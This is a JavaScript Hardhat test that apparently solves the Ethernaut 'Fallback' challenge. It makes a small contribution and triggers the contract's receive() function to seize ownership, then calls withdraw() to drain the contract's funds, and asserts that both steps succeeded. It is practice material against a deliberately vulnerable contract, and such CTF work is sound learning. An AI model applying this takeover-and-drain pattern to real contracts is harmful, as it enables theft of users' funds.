const { expect } = require("chai");
const { ethers, waffle } = require("hardhat");

describe("Fallback", function () {
  it("Claim ownership and reduce the balance to 0", async function () {
    const [_, eoa] = await ethers.getSigners()
    const Contract = await ethers.getContractFactory("Fallback")
    const contract = await Contract.deploy()
    await contract.deployed()

    // First call contribute passing in a value of < 0.001
    await contract.connect(eoa).contribute({ value: ethers.utils.parseEther('0.0001')})

    // Now send a transaction to trigger `receive()`
    await eoa.sendTransaction({
      to: contract.address,
      from: eoa.address,
      value: ethers.utils.parseEther('0.001')
      // empty data field because `receive()`
    })

    // Check we are the new owner
    expect(await contract.owner()).to.equal(eoa.address)

    // Drain contract
    await contract.connect(eoa).withdraw()

    // Check that balance of contract is 0
    expect(await contract.provider.getBalance(contract.address)).to.equal('0')
    
  });
});
